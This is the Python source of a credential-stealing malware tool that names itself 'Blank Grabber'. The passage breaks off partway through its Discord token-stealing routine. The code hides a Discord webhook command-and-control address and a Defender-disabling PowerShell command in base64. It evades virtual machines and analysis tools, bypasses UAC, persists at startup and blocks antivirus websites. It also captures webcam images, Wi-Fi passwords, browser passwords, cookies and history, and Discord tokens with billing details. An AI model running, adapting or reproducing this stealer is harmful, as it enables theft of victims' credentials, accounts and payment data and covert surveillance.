# pip install pyaesm urllib3

import base64
import os
import subprocess
import sys
import json
import pyaes
import random
import shutil
import sqlite3
import re
import traceback
import time
import ctypes
import logging
import zlib
from threading import Thread
from ctypes import wintypes
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()

class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI1MDQxNTcyODU1Nzk0ODkzOS9ETXBEcXg3ZVB2WTEtenpjY2x4aFcxMnIwRUMzVHB4cXQ4eS01SXBFQnB2U01NdDJZTGxIUmcyV1NwdGY3NXR4aThscQ==').decode())
    Mutex = base64.b64decode('UHp3YU5xOWtIYjB1RmdoaA==').decode()
    PingMe = bool('')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
    UacBypass = bool('')
    ArchivePassword = 'skid'
    HideConsole = bool('true')
    Debug = bool('')
    RunBoundOnStartup = bool('')
    CaptureWebcam = bool('true')
    CapturePasswords = bool('true')
    CaptureCookies = bool('true')
    CaptureAutofills = bool('true')
    CaptureHistory = bool('true')
    CaptureDiscordTokens = bool('true')
    CaptureGames = bool('true')
    CaptureWifiPasswords = bool('true')
    CaptureSystemInfo = bool('true')
    CaptureScreenshot = bool('true')
    CaptureTelegram = bool('true')
    CaptureCommonFiles = bool('true')
    CaptureWallets = bool('true')
    FakeError = (bool(''), ('', '', '0'))
    BlockAvSites = bool('true')
    DiscordInjection = bool('true')
if not hasattr(sys, '_MEIPASS'):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
logging.basicConfig(format='\x1b[1;36m%(funcName)s\x1b[0m:\x1b[1;33m%(levelname)7s\x1b[0m:%(message)s')
for (_, logger) in logging.root.manager.loggerDict.items():
    logger.disabled = True
Logger = logging.getLogger('Blank Grabber')
Logger.setLevel(logging.INFO)
if not Settings.Debug:
    Logger.disabled = True

class VmProtect:
    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

    @staticmethod
    def checkUUID() -> bool:
        Logger.info('Checking UUID')
        uuid = subprocess.run('wmic csproduct get uuid', shell=True, capture_output=True).stdout.splitlines()[2].decode(errors='ignore').strip()
        return uuid in VmProtect.BLACKLISTED_UUIDS

    @staticmethod
    def checkComputerName() -> bool:
        Logger.info('Checking computer name')
        computername = os.getenv('computername')
        return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES

    @staticmethod
    def checkUsers() -> bool:
        Logger.info('Checking username')
        user = os.getlogin()
        return user.lower() in VmProtect.BLACKLISTED_USERS

    @staticmethod
    def checkHosting() -> bool:
        Logger.info('Checking if system is hosted online')
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(errors='ignore').strip() == 'true'
        except Exception:
            Logger.info('Unable to check if system is hosted online')
            return False

    @staticmethod
    def checkHTTPSimulation() -> bool:
        Logger.info('Checking if system is simulating connection')
        http = PoolManager(cert_reqs='CERT_NONE', timeout=1.0)
        try:
            http.request('GET', f'https://blank-{Utility.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True

    @staticmethod
    def checkRegistry() -> bool:
        Logger.info('Checking registry')
        r1 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2', capture_output=True, shell=True)
        r2 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2', capture_output=True, shell=True)
        gpucheck = any((x.lower() in subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip().lower() for x in ('virtualbox', 'vmware')))
        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        return r1.returncode != 1 and r2.returncode != 1 or gpucheck or dircheck

    @staticmethod
    def killTasks() -> None:
        Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)

    @staticmethod
    def isVM() -> bool:
        Logger.info('Checking if system is a VM')
        Thread(target=VmProtect.killTasks, daemon=True).start()
        result = VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
        if result:
            Logger.info('System is a VM')
        else:
            Logger.info('System is not a VM')
        return result

class Errors:
    errors: list[str] = []

    @staticmethod
    def Catch(func):

        def newFunc(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if isinstance(e, KeyboardInterrupt):
                    os._exit(1)
                if not isinstance(e, UnicodeEncodeError):
                    trb = traceback.format_exc()
                    Errors.errors.append(trb)
                    if Utility.GetSelf()[1]:
                        Logger.error(trb)
        return newFunc

class Tasks:
    threads: list[Thread] = list()

    @staticmethod
    def AddTask(task: Thread) -> None:
        Tasks.threads.append(task)

    @staticmethod
    def WaitForAll() -> None:
        for thread in Tasks.threads:
            thread.join()

class Syscalls:

    @staticmethod
    def CaptureWebcam(index: int, filePath: str) -> bool:
        avicap32 = ctypes.windll.avicap32
        WS_CHILD = 1073741824
        WM_CAP_DRIVER_CONNECT = 1024 + 10
        WM_CAP_DRIVER_DISCONNECT = 1026
        WM_CAP_FILE_SAVEDIB = 1024 + 100 + 25
        hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR('Blank'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
        result = False
        if hcam:
            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
                    result = True
                ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
            ctypes.windll.user32.DestroyWindow(hcam)
        return result

    @staticmethod
    def CreateMutex(mutex: str) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)
        return kernel32.GetLastError() != 183

    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str=None) -> bytes:

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None
        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode('utf-16')
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)
        raise ValueError('Invalid encrypted_data provided!')

    @staticmethod
    def HideConsole() -> None:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

class Utility:

    @staticmethod
    def GetSelf() -> tuple[str, bool]:
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def TaskKill(*tasks: str) -> None:
        tasks = list(map(lambda x: x.lower(), tasks))
        out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
        for i in out:
            i = i.split('\r\n')[:2]
            try:
                (name, pid) = (i[0].split()[-1], int(i[1].split()[-1]))
                name = name[:-4] if name.endswith('.exe') else name
                if name.lower() in tasks:
                    subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
            except Exception:
                pass

    @staticmethod
    def UACPrompt(path: str) -> bool:
        return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42

    @staticmethod
    def DisableDefender() -> None:
        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')
        subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def ExcludeFromDefender(path: str=None) -> None:
        if path is None:
            path = Utility.GetSelf()[0]
        subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def GetRandomString(length: int=5, invisible: bool=False):
        if invisible:
            return ''.join(random.choices(['\xa0', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
        else:
            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

    @staticmethod
    def GetWifiPasswords() -> dict:
        profiles = list()
        passwords = dict()
        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
            if 'All User Profile' in line:
                name = line[line.find(':') + 1:].strip()
                profiles.append(name)
        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[line.find(':') + 1:].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords

    @staticmethod
    def GetLnkTarget(path_to_lnk: str) -> str | None:
        target = None
        if os.path.isfile(path_to_lnk):
            output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_to_lnk).replace('\\', '\\\\'), shell=True, capture_output=True).stdout.decode()
            if output:
                for line in output.splitlines():
                    if line.startswith('Target='):
                        temp = line.lstrip('Target=').strip()
                        if os.path.exists(temp):
                            target = temp
                            break
        return target

    @staticmethod
    def GetLnkFromStartMenu(app: str) -> list[str]:
        shortcutPaths = []
        startMenuPaths = [os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'), os.path.join('C:\\', 'ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs')]
        for startMenuPath in startMenuPaths:
            for (root, _, files) in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == '%s.lnk' % app.lower():
                        shortcutPaths.append(os.path.join(root, file))
        return shortcutPaths

    @staticmethod
    def IsAdmin() -> bool:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1

    @staticmethod
    def UACbypass(method: int=1) -> bool:
        if Utility.GetSelf()[1]:
            execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
            match method:
                case 1:
                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('computerdefaults --nouacbypass')
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case 2:
                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('fodhelper --nouacbypass')
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case _:
                    return False
            return True

    @staticmethod
    def IsInStartup() -> bool:
        path = os.path.dirname(Utility.GetSelf()[0])
        return os.path.basename(path).lower() == 'startup'

    @staticmethod
    def PutInStartup() -> str:
        STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
        (file, isExecutable) = Utility.GetSelf()
        if isExecutable:
            out = os.path.join(STARTUPDIR, '{}.scr'.format(Utility.GetRandomString(invisible=True)))
            os.makedirs(STARTUPDIR, exist_ok=True)
            try:
                shutil.copy(file, out)
            except Exception:
                return None
            return out

    @staticmethod
    def IsConnectedToInternet() -> bool:
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            return http.request('GET', 'https://gstatic.com/generate_204').status == 204
        except Exception:
            return False

    @staticmethod
    def DeleteSelf():
        (path, isExecutable) = Utility.GetSelf()
        if isExecutable:
            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(path)

    @staticmethod
    def HideSelf() -> None:
        (path, _) = Utility.GetSelf()
        subprocess.Popen('attrib +h +s "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def BlockSites() -> None:
        if Utility.IsAdmin():
            call = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath', shell=True, capture_output=True)
            if call.returncode != 0:
                hostdirpath = os.path.join('System32', 'drivers', 'etc')
            else:
                hostdirpath = os.sep.join(call.stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
            hostfilepath = os.path.join(os.getenv('systemroot'), hostdirpath, 'hosts')
            if not os.path.isfile(hostfilepath):
                return
            with open(hostfilepath) as file:
                data = file.readlines()
            BANNED_SITES = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
            newdata = []
            for i in data:
                if any([x in i for x in BANNED_SITES]):
                    continue
                else:
                    newdata.append(i)
            for i in BANNED_SITES:
                newdata.append('\t0.0.0.0 {}'.format(i))
                newdata.append('\t0.0.0.0 www.{}'.format(i))
            newdata = '\n'.join(newdata).replace('\n\n', '\n')
            subprocess.run('attrib -r {}'.format(hostfilepath), shell=True, capture_output=True)
            with open(hostfilepath, 'w') as file:
                file.write(newdata)
            subprocess.run('attrib +r {}'.format(hostfilepath), shell=True, capture_output=True)

class Browsers:

    class Chromium:
        BrowserPath: str = None
        EncryptionKey: bytes = None

        def __init__(self, browserPath: str) -> None:
            if not os.path.isdir(browserPath):
                raise NotADirectoryError('Browser path not found!')
            self.BrowserPath = browserPath

        def GetEncryptionKey(self) -> bytes | None:
            if self.EncryptionKey is not None:
                return self.EncryptionKey
            else:
                localStatePath = os.path.join(self.BrowserPath, 'Local State')
                if os.path.isfile(localStatePath):
                    with open(localStatePath, encoding='utf-8', errors='ignore') as file:
                        jsonContent: dict = json.load(file)
                    encryptedKey: str = jsonContent['os_crypt']['encrypted_key']
                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                    return self.EncryptionKey
                else:
                    return None

        def Decrypt(self, buffer: bytes, key: bytes) -> str:
            version = buffer.decode(errors='ignore')
            if version.startswith(('v10', 'v11')):
                iv = buffer[3:15]
                cipherText = buffer[15:]
                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors='ignore')
            else:
                return str(Syscalls.CryptUnprotectData(buffer))

        def GetPasswords(self) -> list[tuple[str, str, str]]:
            encryptionKey = self.GetEncryptionKey()
            passwords = list()
            if encryptionKey is None:
                return passwords
            loginFilePaths = list()
            for (root, _, files) in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'login data':
                        filepath = os.path.join(root, file)
                        loginFilePaths.append(filepath)
            for path in loginFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
                    for (url, username, password) in results:
                        password = self.Decrypt(password, encryptionKey)
                        if url and username and password:
                            passwords.append((url, username, password))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return passwords

        def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
            encryptionKey = self.GetEncryptionKey()
            cookies = list()
            if encryptionKey is None:
                return cookies
            cookiesFilePaths = list()
            for (root, _, files) in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'cookies':
                        filepath = os.path.join(root, file)
                        cookiesFilePaths.append(filepath)
            for path in cookiesFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall()
                    for (host, name, path, cookie, expiry) in results:
                        cookie = self.Decrypt(cookie, encryptionKey)
                        if host and name and cookie:
                            cookies.append((host, name, path, cookie, expiry))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return cookies

        def GetHistory(self) -> list[tuple[str, str, int]]:
            history = list()
            historyFilePaths = list()
            for (root, _, files) in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'history':
                        filepath = os.path.join(root, file)
                        historyFilePaths.append(filepath)
            for path in historyFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
                    for (url, title, vc, lvt) in results:
                        if url and title and (vc is not None) and (lvt is not None):
                            history.append((url, title, vc, lvt))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            history.sort(key=lambda x: x[3], reverse=True)
            return list([(x[0], x[1], x[2]) for x in history])

        def GetAutofills(self) -> list[str]:
            autofills = list()
            autofillsFilePaths = list()
            for (root, _, files) in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'web data':
                        filepath = os.path.join(root, file)
                        autofillsFilePaths.append(filepath)
            for path in autofillsFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results: list[str] = [x[0] for x in cursor.execute('SELECT value FROM autofill').fetchall()]
                    for data in results:
                        data = data.strip()
                        if data and (not data in autofills):
                            autofills.append(data)
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return autofills

class Discord:
    httpClient = PoolManager(cert_reqs='CERT_NONE')
    ROAMING = os.getenv('appdata')
    LOCALAPPDATA = os.getenv('localappdata')
    REGEX = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
    REGEX_ENC = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'

    @staticmethod
    def GetHeaders(token: str=None) -> dict:
        headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36'}
        if token:
            headers['authorization'] = token
        return headers

    @staticmethod
    def GetTokens() -> list[dict]:
        results: list[dict] = list()
        tokens: list[str] = list()
        threads: list[Thread] = list()
        paths = {'Discord': os.path.join(Discord.ROAMING, 'discord'), 'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'), 'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'), 'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'), 'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'), 'Amigo': os.path.join(Discord.LOCALAPPDATA, 'Amigo', 'User Data'), 'Torch': os.path.join(Discord.LOCALAPPDATA, 'Torch', 'User Data'), 'Kometa': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'), 'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'), 'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'), '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Star', '7Star', 'User Data'), 'Sputnik': os.path.join(Discord.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'), 'Vivaldi': os.path.join(Discord.LOCALAPPDATA, 'Vivaldi', 'User Data'), 'Chrome SxS': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'), 'Chrome': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'), 'FireFox': os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles'), 'Epic Privacy Browse': os.path.join(Discord.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'), 'Microsoft Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'), 'Uran': os.path.join(Discord.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'), 'Yandex': os.path.join(Discord.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'), 'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Iridium': os.path.join(Discord.LOCALAPPDATA, 'Iridium', 'User Data')}
        for (name, path) in paths.items():
            if os.path.isdir(path):
                if name == 'FireFox':
                    t = Thread(target=lambda : tokens.extend(Discord.FireFoxSteal(path) or list()))
                    t.start()
                    threads.append(t)
                else:
                    t = Thread(target=lambda : tokens.extend(Discord.SafeStorageSteal(path) or list()))
                    t.start()
                    threads.append(t)
                    t = Thread(target=lambda : tokens.extend(Discord.SimpleSteal(path) or list()))
                    t.start()
                    threads.append(t)
        for thread in threads:
            thread.join()
        tokens = [*set(tokens)]
        for token in tokens:
            r: HTTPResponse = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me', headers=Discord.GetHeaders(token.strip()))
            if r.status == 200:
                r = r.data.decode(errors='ignore')
                r = json.loads(r)
                user = r['username'] + '#' + str(r['discriminator'])
                id = r['id']
                email = r['email'].strip() if r['email'] else '(No Email)'
                phone = r['phone'] if r['phone'] else '(No Phone Number)'
                verified = r['verified']
                mfa = r['mfa_enabled']
                nitro_type = r.get('premium_type', 0)
                nitro_infos = {0: 'No Nitro', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors='ignore'))
                if len(billing) == 0:
                    billing = '(No Payment Method)'
                else:
                    methods = {'Card': 0, 'Paypal': 0, 'Unknown': 0}
                    for m in billing:
                        if not isinstance(m, dict):
                            continue
                        method_type = m.get('type', 0)
                        match method_type:
                            case 1:
                                methods['Card'] += 1
                            case 2:
                                methods['Paypal'] += 1
                            case _:
                                methods['Unknown'] += 1
                    billing = ', '.join(['{} ({})'.format(name, quantity) for (name, quantity) in methods.items() if quantity != 0]) or 'None'
                gifts = list()
                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=Discord.GetHeaders(token)).data.decode(errors='ignore')
                if 'code' in r:
                    r = json.loads(r)
                    for i in r:
                        if isinstance(i, dict):
                            code = i.get('code')
                            if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                continue
                            title = i['promotion'].get('outbound_title')
                            if code and title:
                                gifts.append(f'{title}: {code}')
